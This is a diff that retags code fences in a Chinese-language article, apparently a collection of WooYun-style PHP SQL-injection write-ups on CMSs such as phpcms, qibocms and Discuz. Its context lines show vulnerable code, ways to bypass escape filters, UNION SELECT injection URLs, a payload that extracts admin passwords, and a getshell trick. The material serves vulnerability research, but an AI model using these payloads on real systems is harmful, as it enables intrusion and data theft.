@@ -8,7 +8,7 @@
 
 一些用了预编译或者是在查询的函数中再来过滤 很多时候就给跪了。
 
-```
+```php
 select update insert delete 
 ```
 
@@ -158,7 +158,7 @@ Select * from $pre_admin where xxx 像这种的就覆盖掉$pre
 
 那么就留下了\ 导致可以吃掉一个单引号 是 double query 的话
 
-```
+```php
 Select * from c_admin where username=’admin\’ and email=’inject#’ 
 ```
 
@@ -178,7 +178,7 @@ Select * from c_admin where username=’admin\’ and email=’inject#’
 
 例如这段代码
 
-```
+```php
 $order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']); 
 ```
 
@@ -194,7 +194,7 @@ $order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);
 
 Addslashes 会对' " \ NULL 转义
 
-```
+```php
 ' =>  \'
 " => \"
 \ => \\
@@ -239,7 +239,7 @@ NULL => \0
 
 Douphp 中的获取 ip 的函数。
 
-```
+```php
 function get_ip() {
 static $ip;
 if (isset($_SERVER)) {
@@ -271,7 +271,7 @@ return '127.0.0.1';
 
 来看看验证 ip 是否合法的正则
 
-```
+```php
 preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/', $ip) 
 ```
 
@@ -359,7 +359,7 @@ FILES 注入一般是因为上传 会把上传的名字带到 insert 当中入�
 
 代码大概如
 
-```
+```php
 <?php
 $key=0;
 $a=$_GET[a][$key];
@@ -421,7 +421,7 @@ Uc 的话 一般会遇到的问题是 uckey 默认的。
 
 一般的是
 
-```
+```php
 $id=$_GET[id];
 Select * from table where id=$id; 
 ```
@@ -434,13 +434,13 @@ $id 没被单引号 且 没有被强制类型转换 那么就算 addslashes 了 
 
 这里 supesite 的注入还涉及到了一个设计缺陷。这里把
 
-```
+```php
 $query = $_SGLOBAL['db']->query('SELECT * FROM '.tname('spacetags').' WHERE itemid=\''.$itemid.'\' AND status=\''.$status.'\'') 
 ```
 
 $itemid 首先带入到了查询当中 是被单引号了的。。 如果查询出来的有结果 才会带入到 delete 中 如果无结果 就不执行 delete 的语句了。而在数据库中 itemid 中 存储的是 int 类型 所以他这里本意是想要用户只能提交数字型才能查询出结果。 如果不是提交的数字的话 那么就查询不出来结果 就不去执行下面的 delete 语句了。但是由于 mysql 的类型转换 因为他这里储存的是 int 类型 所以我们提交 4xxxxx 跟我们提交 4 是一样的
 
-```
+```php
 $_SGLOBAL['db']->query('DELETE FROM '.tname('spacetags').' WHERE itemid='.$itemid.' AND tagid IN ('.simplode($deletetagidarr).') AND status=\''.$status.'\''); 
 ```
 
@@ -452,7 +452,7 @@ $_SGLOBAL['db']->query('DELETE FROM '.tname('spacetags').' WHERE itemid='.$itemi
 
 一些厂商喜欢这样写
 
-```
+```php
 If ($a>1){
 Mysql_query(select id from table where id=$a)
 } 
@@ -466,7 +466,7 @@ Mysql_query(select id from table where id=$a)
 
 也是一种比较常见的注入。 涉及到的是入库和出库。 因为有全局转义 然后入库的时候
 
-```
+```php
 Insert into table (username) values ('a\''); 
 ```
 
@@ -498,7 +498,7 @@ Insert into table (username) values ('a\'');
 
 有些 cms 在全局 addslashes 后 然后在后面的文件中又 stripslashes 去掉了转义符 然后又可以闭合单引号了。
 
-```
+```php
 $_SESSION['flow_consignee'] = stripslashes_deep($consignee); 
 ```
 
@@ -536,7 +536,7 @@ $_SESSION['flow_consignee'] = stripslashes_deep($consignee);
 
 其实就是这次的 DZ6.X 7.X 那个任意代码执行的漏洞
 
-```
+```php
 if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
 exit('Request tainting attempted.');
 }
@@ -604,7 +604,7 @@ GBK 2 字节一汉字 UTF8 三字节 一汉字。
 
 再看看 74cms 的全局过滤
 
-```
+```php
 function remove_xss($string) { 
 
     $string = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S', '', $string);
@@ -652,7 +652,7 @@ function remove_xss($string) {
 
 第八处: plus/ajax_common.php 中
 
-```
+```php
 elseif($act=="hotword")
 
 {
@@ -712,7 +712,7 @@ elseif($act=="hotword")
 
 第 9 处 在 plus/ajax_officebuilding.php 中
 
-```
+```php
 elseif($act == 'key')
 
 {
@@ -798,7 +798,7 @@ elseif($act == 'key')
 
 在 download/s_rpc.php 中
 
-```
+```php
 <?php
 
 require(dirname(__FILE__).'/global.php');
@@ -828,7 +828,7 @@ $queryString = $_POST['queryString'];
 
 虽然全局转义 不过有
 
-```
+```php
 $cnvert = new Chinese("UTF8","GB2312",$_POST['queryString'],ROOT_PATH."./inc/gbkcode/");
 
 $_POST['queryString'] = $cnvert->ConvertIT();
@@ -880,7 +880,7 @@ B2B 系统。
 
 在 news/js.php 中
 
-```
+```php
 f($type=='hot'||$type=='com'||$type=='new'||$type=='lastview'||$type=='like')
 
 {
@@ -1030,7 +1030,7 @@ f($type=='hot'||$type=='com'||$type=='new'||$type=='lastview'||$type=='like')
 
 在 ajax.php 中
 
-```
+```php
 case 'uploadCloud':
 
         $folder_id = (int)gpc('folder_id','P',0);
@@ -1128,7 +1128,7 @@ case 'uploadCloud':
 
 来利用下面的这个 else 里面的来注入把。
 
-```
+```php
 lse{
 
                 $file = unserialize(base64_decode($data));
@@ -1162,7 +1162,7 @@ YToxOntzOjc6ImZpbGVfaWQiO3M6MTk6ImFhJyBVTklPTiBTRUxFQ1QgMSMiO30=
 
 这里我直接把语句输出来把。
 
-```
+```php
 $file = unserialize(base64_decode($data));
 
                 //write_file(PHPDISK_ROOT.'system/ax.txt',var_export($file,true),'ab');
@@ -1206,7 +1206,7 @@ qibocms 分类系统。
 
 在 member/company.php 中
 
-```
+```php
 $cpDB=$db->get_one("SELECT * FROM `{$pre}memberdata_1` WHERE uid='$lfjuid'");
 
     if($step==2){
@@ -1308,7 +1308,7 @@ $cpDB=$db->get_one("SELECT * FROM `{$pre}memberdata_1` WHERE uid='$lfjuid'");
 
 在 member.php
 
-```
+```php
 case 'check_info_gold':
 
         $json = new Services_JSON;
@@ -1358,7 +1358,7 @@ WooYun 回答：有！
 
 1\. 来看核心的文件 admin/include/common.inc.php(下面的代码有我自己添加的调试代码)
 
-```
+```php
 /*
 
  * added by mody
@@ -1402,7 +1402,7 @@ foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
 
 2\. 来看看 daddslashes()函数，在文件 admin/include/global.func.php
 
-```
+```php
 /*POST 变量转换*/
 
 function daddslashes($string, $force = 0 ,$sql_injection =0,$url =0){
@@ -1506,7 +1506,7 @@ function daddslashes($string, $force = 0 ,$sql_injection =0,$url =0){
 
 这个文件包含了 admin/include/common.inc.php，但是却没有进行 login_check，所以导致这个文件能够不登录直接访问。如下：
 
-```
+```php
 <?php
 
 # MetInfo Enterprise Content Management System 
@@ -1526,7 +1526,7 @@ function daddslashes($string, $force = 0 ,$sql_injection =0,$url =0){
 
 接着他进行了一项很危险的操作：
 
-```
+```php
 foreach($settings_arr as $key=>$val){
 
         if($val['columnid']==$class1){
@@ -1544,7 +1544,7 @@ foreach($settings_arr as $key=>$val){
 
 那么，如何利用，我们来找下面的 sql 语句，总共有三句，找第一句即可
 
-```
+```php
 $query = "SELECT * FROM $met_parameter where module=8 and lang='$lang' order by no_order"; 
 
          //>>>>注意，$met_parameter 是在$settings_arr 后被初始化的，不能直接覆盖，但是可以结合上面的危险操作，进行覆盖<<<<
@@ -1652,7 +1652,7 @@ step3：破解 admin 密码
 
 /phpcms/modules/member/content.php 202 行 edit 函数
 
-```
+```php
 public function edit() {
 
     $_username = $this->memberinfo['username'];
@@ -1724,7 +1724,7 @@ public function edit() {
 
 229 行
 
-```
+```php
 $this->content_db->edit_content($_POST['info'],$id); 
 ```
 
@@ -1738,7 +1738,7 @@ $this->content_db->edit_content($_POST['info'],$id);
 
 /phpcms/model/content_model.class.php 第 234 行开始
 
-```
+```php
 public function edit_content($data,$id) {
 
         $model_tablename = $this->model_tablename;
@@ -1774,7 +1774,7 @@ public function edit_content($data,$id) {
 
 /caches/caches_model/caches_data/content_input.class.php 第 55 行开始
 
-```
+```php
 if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
 
 $MODEL = getcache('model', 'commons');
@@ -1800,13 +1800,13 @@ if($this->fields[$field]['issystem']) {
 
 我们重点关注这里是怎么处理的
 
-```
+```php
 if(method_exists($this, $func)) $value = $this->$func($field, $value); 
 ```
 
 为了方便看清楚程序在这里究竟是怎样处理的,我们在这行代码前面加入以下调试代码，看看都经过了哪些函数的处理...
 
-```
+```php
 if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
 
 $MODEL = getcache('model', 'commons');
@@ -1842,7 +1842,7 @@ if($this->fields[$field]['issystem']) {
 
 /caches/caches_model/caches_data/content_input.class.php 第 102 行 image 函数
 
-```
+```php
 function image($field, $value) {
 
     $value = str_replace(array("'",'"','(',')'),'',$value);
@@ -1880,7 +1880,7 @@ step3 在缩略图栏填入 [`**.**.**.**/sql.jpg'，如图`](http://**.**.**.**
 
 点击提交，采用 Tamper data 抓包修改，将 info[islink]修改为
 
-```
+```php
 ,title=(select concat(username,password) from v9_admin where userid=1) -- felixk3y 
 ```
 
@@ -1914,7 +1914,7 @@ step3 在缩略图栏填入 [`**.**.**.**/sql.jpg'，如图`](http://**.**.**.**
 
 看了看官网发的补丁。
 
-```
+```php
 foreach($_POST as $key =>$data) {
 
                 if(preg_match('/(=|<|>)/', $data)){
@@ -1930,7 +1930,7 @@ foreach($_POST as $key =>$data) {
 
 但是在这文件 还有一个函数。
 
-```
+```php
 $payment  = pay::get_payment($_GET['code']);
 
         $seller_email = rawurldecode($_GET['seller_email']);
@@ -1962,7 +1962,7 @@ $payment  = pay::get_payment($_GET['code']);
 
 那现在来看看 check_money
 
-```
+```php
 public static function check_money($id,$money) {
 
         $where=array();
@@ -1980,7 +1980,7 @@ public static function check_money($id,$money) {
 
 可以看到是把 order_sn 带入了 getrow; 再继续
 
-```
+```php
 function getrow($condition,$order='1 desc',$cols='*') {
 
         $this->condition($condition);
@@ -1988,7 +1988,7 @@ function getrow($condition,$order='1 desc',$cols='*') {
         return $this->rec_select_one($condition,'*',$order); 
 ```
 
-```
+```php
 function sql_select($tbname,$where="",$limit=0,$fields="*",$order='') {
 
         $sql="SELECT ".$fields." FROM `".$tbname."` ".($where ?" WHERE ".$where : "")." ORDER BY ".$order.($limit ?" limit ".$limit : "");
@@ -2050,7 +2050,7 @@ $order_sn = trim($order_sn);
 
 model/register.class.php
 
-```
+```php
 function regsave_action(){
 
         $_POST=$this->post_trim($_POST);
@@ -2062,7 +2062,7 @@ function regsave_action(){
 
 省略点
 
-```
+```php
 ip = $this->obj->fun_ip_get();
 
             $data['username']=$_POST['username'];
@@ -2100,7 +2100,7 @@ ip = $this->obj->fun_ip_get();
 
 1 在　/include/public.function.php　中
 
-```
+```php
 function fun_ip_get() {
 
     if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
@@ -2144,7 +2144,7 @@ function fun_ip_get() {
 
 ２　/model/class/action.class.php
 
-```
+```php
 function fun_ip_get() {
 
         if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
@@ -2186,7 +2186,7 @@ function fun_ip_get() {
 
 继续在 model/register.class.php 里面看。
 
-```
+```php
 $ip = $this->obj->fun_ip_get();
 
             $data['username']=$_POST['username'];
@@ -2216,7 +2216,7 @@ $ip = $this->obj->fun_ip_get();
 
 然后就带入到了 insert 当中
 
-```
+```php
 function insert_into($table,$data=array()){
 
         $value="";
@@ -2262,7 +2262,7 @@ function insert_into($table,$data=array()){
 
 在 model/login.class.php 中
 
-```
+```php
 function loginsave_action()
 
     { 
@@ -2304,7 +2304,7 @@ function loginsave_action()
 
 省略一点
 
-```
+```php
 $time = time();
 
                             $ip = $this->obj->fun_ip_get();
@@ -2322,7 +2322,7 @@ $this->obj->fun_ip_get(); 再次调用了这函数,
 
 进入 DB_update_all
 
-```
+```php
 function DB_update_all($tablename, $value, $where = 1){
 
         $SQL = "UPDATE `" . $this->def . $tablename . "` SET $value WHERE $where";
@@ -2344,7 +2344,7 @@ function DB_update_all($tablename, $value, $where = 1){
 
 再来看一下 360webscan。
 
-```
+```php
 foreach($_GET as $key=>$value) {
 
       webscan_StopAttack($key,$value,$getfilter,"GET");
@@ -2418,7 +2418,7 @@ server 里面只检测了 referer
 
 /lib/default/user_act.php 326 行左右，及/lib/tool/front_class.php 541 行左右，有对 ip 是否正确的判断：
 
-```
+```php
 if(!preg_match('/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/', front::ip())&&!preg_match('@^\s*((([0-9A-Fa-f]{1,4}:){7}(([0-9A-Fa-f]{1,4})|:))|(([0-9A-Fa-f]{1,4}:){6}(:|((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})|(:[0-9A-Fa-f]{1,4})))|(([0-9A-Fa-f]{1,4}:){5}((:((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){4}(:[0-9A-Fa-f]{1,4}){0,1}((:((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){3}(:[0-9A-Fa-f]{1,4}){0,2}((:((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){2}(:[0-9A-Fa-f]{1,4}){0,3}((:((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:)(:[0-9A-Fa-f]{1,4}){0,4}((:((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(:(:[0-9A-Fa-f]{1,4}){0,5}((:((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(((25[0-5]|2[0-4]\d|[01]?\d{1,2})(\.(25[0-5]|2[0-4]\d|[01]?\d{1,2})){3})))(%.+)?\s*$@', front::ip())){ //这位置写得太复杂了，好像很强大，我看到了(%.+)?，呃，%'不过可以注入引号了？
 
                     exit('来源非法');
@@ -2462,7 +2462,7 @@ if(!preg_match('/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|
 
 在 hy/choose_pic.php 中
 
-```
+```php
 if($action=='upload'){
 
     if(is_uploaded_file($_FILES[postfile][tmp_name])){
@@ -2546,7 +2546,7 @@ Insert 无视 GPC 装 supesite 会有 ucenter 如果在一个裤的话 可以尝
 
 来看看全局文件
 
-```
+```php
 if(!(get_magic_quotes_gpc())) {
 
     $_GET = saddslashes($_GET);
@@ -2566,7 +2566,7 @@ if(!(get_magic_quotes_gpc())) {
 
 在 batch.upload.php 中
 
-```
+```php
 elseif (!empty($_POST)) { //如果 POST 不为空
 
     //编辑标题
@@ -2708,7 +2708,7 @@ END;
 
 $fileext = fileext($filearr['name']);
 
-```
+```php
 function fileext($filename) {
 
     return strtolower(trim(substr(strrchr($filename, '.'), 1)));
@@ -2746,7 +2746,7 @@ function fileext($filename) {
 
 ## 详细说明
 
-```
+```php
 if(ereg("^([-_0-9a-zA-Z]+)$",$_GET[jobs])){
 
     //不读数据库
@@ -2776,7 +2776,7 @@ if(ereg("^([-_0-9a-zA-Z]+)$",$_GET[jobs])){
 
 inc/job/ckreg.php 中
 
-```
+```php
 }elseif($type=='yzimg'){
 
     if($db->get_one("SELECT * FROM {$pre}yzimg WHERE $SQL imgnum='$name' AND sid='$usr_sid'")){
@@ -2810,7 +2810,7 @@ The used SELECT statements have a different number of columns
 
 在 wei/member/post.php 中
 
-```
+```php
 elseif($action=="del")
 
 {
@@ -2844,7 +2844,7 @@ keyword_del($id,$rsdb['keywords']);
 
 这里是出库来的 所以能引入转义符啥的。
 
-```
+```php
 function keyword_del($id,$keyword){
 
     global $db,$_pre;
@@ -2920,7 +2920,7 @@ function keyword_del($id,$keyword){
 
 在 dianping/post.php 中
 
-```
+```php
 if($action=="postnew")
 
 {  
@@ -3020,7 +3020,7 @@ dianping/post.php?action=postnew&fid=11&postdb[address]=xx&postdb[city_id]=x&_er
 
 问题出在齐博搜索的位置，也就是：[`**.**.**.**/coupon/s.php`](http://**.**.**.**/coupon/s.php)
 
-```
+```php
 if($action=="search"){
 
     if(!$webdb[Info_allowGuesSearch]&&!$lfjid){
@@ -3096,7 +3096,7 @@ $fids[]=$rs[fid];
 
 看起来没问题，因为$fids 是$rs[fid]组成的数组。但这里很重要的是，了解齐博的都知道，齐博在 inc/common.inc.php 中有这样一段：
 
-```
+```php
 foreach($_COOKIE AS $_key=>$_value){
 
     unset($$_key);
@@ -3122,7 +3122,7 @@ foreach($_GET AS $_key=>$_value){
 
 我们可以看看演示站：
 
-```
+```php
 http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]='&fids[]=xx
 
 http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0) union select user(),2,3,4,5,6,7,8,9%23 
@@ -3130,7 +3130,7 @@ http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0) union s
 
 ## 漏洞证明
 
-```
+```php
 http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0) union select user(),2,3,4,5,6,7,8,9%23 
 ```
 
@@ -3138,7 +3138,7 @@ http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0) union s
 
 这个洞利用简单，无需登录，可以批量。
 
-```
+```php
 http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20union%20select%20user(),2,3,4,5,6,7,8,9%23
 
 http://**.**.**.**/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20union%20select%20user(),2,3,4,5,6,7,8,9%23
@@ -3180,7 +3180,7 @@ unset($fids);之后再进入 while 循环。
 
 看到/member/userinfo.php，112 到 114 行：
 
-```
+```php
 //过滤不健康的字
 
 $truename=replace_bad_word($truename);
@@ -3192,7 +3192,7 @@ $address=replace_bad_word($address);
 
 这几句过滤代码，意思是想过滤一些“不和谐”的词语。那我们看看这个 replace_bad_word 函数。
 
-```
+```php
 function replace_bad_word($str){
 
     global $Limitword;
@@ -3212,7 +3212,7 @@ function replace_bad_word($str){
 
 实际上是一个 str_replace，将旧的“不和谐”词语替换成新的“和谐”词语。那么替换列表从哪来？看看 data/limitword.php：
 
-```
+```php
 <?php 
 
 $Limitword['造反']='造**';
@@ -3228,7 +3228,7 @@ $Limitword['法轮功']='法**功';
 
 这里的原理是一样的，只不过齐博 cms 之前对一些变量做了过滤：
 
-```
+```php
 $truename=filtrate($truename);
 
 $idcard=filtrate($idcard);
@@ -3320,7 +3320,7 @@ truename=xxxx%0000&Limitword[000]=&email=123@**.**.**.**&provinceid=,address=(se
 
 首先来看一下全局文件
 
-```
+```php
 $_POST=Add_S($_POST);
 
 $_GET=Add_S($_GET);
@@ -3328,7 +3328,7 @@ $_GET=Add_S($_GET);
 $_COOKIE=Add_S($_COOKIE); 
 ```
 
-```
+```php
 function Add_S($array){
 
     foreach($array as $key=>$value){
@@ -3358,7 +3358,7 @@ function Add_S($array){
 
 在 member/post.php 中
 
-```
+```php
 if($lfjid)
 
 {
@@ -3378,7 +3378,7 @@ if($lfjid)
 
 也是有权限的 所以。。
 
-```
+```php
 elseif($job=='manage')
 
 {
@@ -3420,7 +3420,7 @@ elseif($job=='manage')
 
 /inc/artic_function.php 中
 
-```
+```php
 /*修改软件*/
 
 function post_edit(){
@@ -3440,7 +3440,7 @@ function post_edit(){
 
 省略一点
 
-```
+```php
 if($rsdb[keywords]!=$postdb[keywords]){
 
         keyword_del($aid,$rsdb[keywords]);
@@ -3450,7 +3450,7 @@ if($rsdb[keywords]!=$postdb[keywords]){
     } 
 ```
 
-```
+```php
 function keyword_del($aid,$keyword){
 
     global $db,$_pre;
@@ -3498,7 +3498,7 @@ keyword_del($aid,$rsdb[keywords]);
 
 发布成功后 因为这里判断了
 
-```
+```php
 if($rsdb[pages]<2){
 
         header("location:post.php?job=edit&aid=$aid&mid=$mid&only=$only");exit; 
@@ -3534,7 +3534,7 @@ if($rsdb[pages]<2){
 
 转义一下。
 
-```
+```php
 foreach( $orderDB AS $key=>$value){
 
             $i++;
@@ -3570,7 +3570,7 @@ $keyword=addslashes($keyword);
 
 再来看看一下 qibocms 的全局过滤函数
 
-```
+```php
 $_POST=Add_S($_POST);
 
 $_GET=Add_S($_GET);
@@ -3578,7 +3578,7 @@ $_GET=Add_S($_GET);
 $_COOKIE=Add_S($_COOKIE); 
 ```
 
-```
+```php
 function Add_S($array){
 
     foreach($array as $key=>$value){
@@ -3628,7 +3628,7 @@ function Add_S($array){
 
 再调用一下 qibo 的这函数
 
-```
+```php
 <?php  
 
 $_GET=Add_S($_GET[a]);
@@ -3682,7 +3682,7 @@ function Add_S($array){
 
 在 member/post.php 中
 
-```
+```php
 elseif($job=='manage')
 
 {
@@ -3766,7 +3766,7 @@ P.S. 狗哥 能否送我个邀请码/hx
 
 全局过滤函数
 
-```
+```php
 function Add_S($array){
 
     foreach($array as $key=>$value){
@@ -3808,7 +3808,7 @@ function Add_S($array){
 
 在 label_module.php 中 这里无需登录任何
 
-```
+```php
 else
 
 {
@@ -3854,7 +3854,7 @@ else
 
 由于 qibo 是
 
-```
+```php
 foreach($_POST AS $_key=>$_value){
 
     !ereg("^\_[A-Z]+",$_key) && $$_key=$_POST[$_key];
@@ -3902,7 +3902,7 @@ key 中直接含单引号 被匹配到然后退出了。
 
 因为我们这样提交 index.php?label[asd'][asd]=asda' 这样的那么他的 value 是数组
 
-```
+```php
 if(is_array($value))
 
         {
@@ -3956,7 +3956,7 @@ P 神给的['a'."${phpinfo()}".''] 利用双引号的二次解析来 Getshell
 
 内容可以搞定了 这里我们再来看一下文件名是咋来的
 
-```
+```php
 $FileName=ROOT_PATH."cache/label_cache/";
 
     if(!is_dir($FileName)){
@@ -4080,7 +4080,7 @@ D:\ApmServ\www\htdocs\qibov7\data\label_hf.php
 
 从 263 行开始 也就是最后的那几行
 
-```
+```php
 if($action == 'newthread') {
 
     ($forum['allowpost'] == -1) && showmessage('forum_access_disallow');
@@ -4112,7 +4112,7 @@ if($action == 'newthread') {
 
 然后在 include/editpost.inc.php 第 272 行左右
 
-```
+```php
 if($thread['special'] == 1 && ($alloweditpoll || $isorigauthor) && !empty($polls)) {
 
                 $pollarray = '';
@@ -4148,7 +4148,7 @@ foreach($pollarray['options'] as $key => $value) {
 
 再来看一下 dz 的全局文件
 
-```
+```php
 foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
 
     foreach($$_request as $_key => $_value) {
@@ -4160,7 +4160,7 @@ foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
 } 
 ```
 
-```
+```php
 function daddslashes($string, $force = 0) {
 
     !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
@@ -4192,7 +4192,7 @@ function daddslashes($string, $force = 0) {
 
 这里对数组中的 value 进行转义 key 无过滤。
 
-```
+```php
 $db->query("DELETE FROM {$tablepre}polloptions WHERE polloptionid='$key' AND tid='$tid' 
 ```
 
@@ -4220,7 +4220,7 @@ $thread['special'] == 1 之前我一直在纠结这个是啥东西。。
 
 这里我输出了一下
 
-```
+```php
 $polladd = '';
 
             if($thread['special'] == 1 && ($alloweditpoll || $isorigauthor) && !empty($polls)) {
@@ -4244,7 +4244,7 @@ $polladd = '';
 
 那不是就可以注入了吗? 构造一下语句。
 
-```
+```php
 if(!trim($value)) {
 
                             $db->query("DELETE FROM {$tablepre}polloptions WHERE polloptionid='$key' AND tid='$tid'"); 
@@ -4288,7 +4288,7 @@ offset
 
 在 zhuangxiu/job.php 中
 
-```
+```php
 if(eregi("^([_0-9a-z]+)$",$job)){
 
     require_once(Mpath."inc/job/$job.php");
@@ -4304,7 +4304,7 @@ if(eregi("^([_0-9a-z]+)$",$job)){
 
 zhuangxiu\inc\job\post_img.php 中
 
-```
+```php
 foreach( $photodb AS $key=>$value){
 
         if(strlen($value)>4&&!eregi("(gif|jpg|png)$",$value)){ //这里限定了 value 结尾必须含有 jpg 啥的
@@ -4404,7 +4404,7 @@ UPDATE `{$_pre}pic` SET name='{$titledb[$key]}',imgurl='$value' WHERE pid='{$pid
 
 在 api/uc.php 中
 
-```
+```php
 define('IN_PHPMPS', true);
 
 define('UC_CLIENT_VERSION', '1.5.0');    //note UCenter 版本标识
@@ -4486,7 +4486,7 @@ UC_KEY 默认为 phpmps。 官网的也如此。
 
 那就来调用这个把
 
-```
+```php
 function updatepw($get, $post) {
 
         global $db,$table;
@@ -4542,7 +4542,7 @@ PHPEMS 整合了 uc。
 
 在 api/config.inc.php 中
 
-```
+```php
 define('UC_CONNECT', 'mysql');
 
 define('UC_DBHOST', 'localhost');
@@ -4606,7 +4606,7 @@ define('UC_KEY', '1234567890');
 
 在 order/chinabank/notify.php 中
 
-```
+```php
 $key = $INI['chinabank']['sec'];
 
 $v_oid     = trim($_POST['v_oid']);  // 商户发送的 v_oid 定单编号   
@@ -4658,7 +4658,7 @@ key 是空的 不用管他。 只是一点点的验证。 MD5 相等可好, 然�
 
 然后带入 CreateFromCharge
 
-```
+```php
 static public function CreateFromCharge($money,$user_id,$time,$service='alipay',$trade_no=''){
 
         global $option_service;
@@ -4740,7 +4740,7 @@ static public function CreateFromCharge($money,$user_id,$time,$service='alipay',
 
 insert 里面的都被单引号了。 而且如果我们提交单引号的话还会被转义。
 
-```
+```php
 Table::UpdateCache('user', $user_id, array(
 
                     'money' => array( "money + {$money}" ),
@@ -4800,7 +4800,7 @@ paypal 和 tenpay 的一起说了。
 
 api\pay\paypal\notify.php 中
 
-```
+```php
 require '../../../common.inc.php';
 
 $_POST = $_DPOST;
@@ -4816,7 +4816,7 @@ if(!$PAY[$bank]['enable']) exit('fail');  //得开启这种支付方式。
 if(!$PAY[$bank]['partnerid']) exit('fail'); 
 ```
 
-```
+```php
 $item_name = $_POST['item_name'];
 
 $item_number = $_POST['item_number'];
@@ -4848,7 +4848,7 @@ paypal 无过滤。 连验证都没验证。
 
 tenpay
 
-```
+```php
 if($resHandler->isTenpaySign()) {
 
     //通知 id
@@ -4876,7 +4876,7 @@ if($resHandler->isTenpaySign()) {
 
 tenpay 里面多了个验证 不过可以轻松通过。、
 
-```
+```php
 $transaction_id = $resHandler->getParameter("transaction_id");
 
     //金额,以分为单位
@@ -4934,7 +4934,7 @@ $transaction_id = $resHandler->getParameter("transaction_id");
 
 在 user\pay.php 中
 
-```
+```php
 public function tenpay_return_url() { 
 
         require_once (CSCMSPATH."tenpay/ResponseHandler.class.php");
@@ -5018,7 +5018,7 @@ getParameter 就相当 request 把?
 
 这里是没有过滤的。 但是有点验证。
 
-```
+```php
 function isTenpaySign() {
 
         $signPars = "";
@@ -5082,7 +5082,7 @@ Fighting
 
 在/hy/member/homepage_ctrl.php 中
 
-```
+```php
 if($atn&&eregi("^([_a-z0-9]+)$",$atn)&&is_file(dirname(__FILE__)."/homepage_ctrl/$atn.php")){
 
     require_once(dirname(__FILE__)."/homepage_ctrl/$atn.php");
@@ -5094,7 +5094,7 @@ if($atn&&eregi("^([_a-z0-9]+)$",$atn)&&is_file(dirname(__FILE__)."/homepage_ctrl
 
 hy\member\homepage_ctrl\pic_edit.php 中
 
-```
+```php
 if(count($pids)<1) showerr("至少选择一项");
 
 $pids=implode(",",$pids);
@@ -5156,7 +5156,7 @@ Delete 如果 ucenter 和 supesite 在一个裤的话 可以尝试把 uckey 注�
 
 在 cp.php 中
 
-```
+```php
 $ac = empty($_GET['ac']) ? 'profile' : trim($_GET['ac']);
 
 if(in_array($ac, array('index', 'news', 'profile', 'credit', 'models'))) {
@@ -5168,7 +5168,7 @@ if(in_array($ac, array('index', 'news', 'profile', 'credit', 'models'))) {
 
 在 source/cp_news.php 中
 
-```
+```php
 if(empty($itemid)) { //这里让$itemid 不为空
 
         if(!empty($_SCONFIG['posttime']) && $_SGLOBAL['group']['groupid'] != 1) {
@@ -5246,7 +5246,7 @@ if(empty($itemid)) { //这里让$itemid 不为空
     } 
 ```
 
-```
+```php
 function postspacetag($op, $type, $itemid, $tagarr, $status) {
 
     global $_SGLOBAL;
@@ -5374,7 +5374,7 @@ intval 或者 单引号上把
 
 在 model/redeem.class.php 中
 
-```
+```php
 function dh_action(){
 
         $this->public_action();
@@ -5508,7 +5508,7 @@ function dh_action(){
         } 
 ```
 
-```
+```php
 function DB_update_all($tablename, $value, $where = 1){
 
         $SQL = "UPDATE `" . $this->def . $tablename . "` SET $value WHERE $where";
@@ -5528,7 +5528,7 @@ function DB_update_all($tablename, $value, $where = 1){
 
 可以看到前面有三个比较。
 
-```
+```php
 if($_POST['num']<1){ //这里比较是否小于 1 php 弱语言 像 1asdxx 都能过。
 
